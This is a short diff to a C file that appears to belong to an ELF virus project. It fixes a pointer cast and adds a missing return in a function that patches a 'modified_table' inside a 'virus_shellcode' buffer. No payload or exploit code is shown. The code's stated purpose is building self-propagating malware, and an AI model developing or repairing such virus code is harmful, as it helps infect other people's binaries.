@@ -152,7 +152,7 @@ int set_modif_infos(){
 
 	int64_t off_mt;
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "modified_table", &off_mt);
- 	Modif *mt = ((Garbage *)((char *)(virus_shellcode + off_mt)));
+ 	Modif *mt = (Modif *)((Garbage *)((char *)(virus_shellcode + off_mt)));
 
 	Elf64_Shdr *symtab = NULL;
 	Elf64_Shdr *strtab = NULL;
@@ -178,6 +178,7 @@ int set_modif_infos(){
 			i += 1;
 		}
 	}
+	return TRUE;
 }
 
 int main(int ac, char **av){
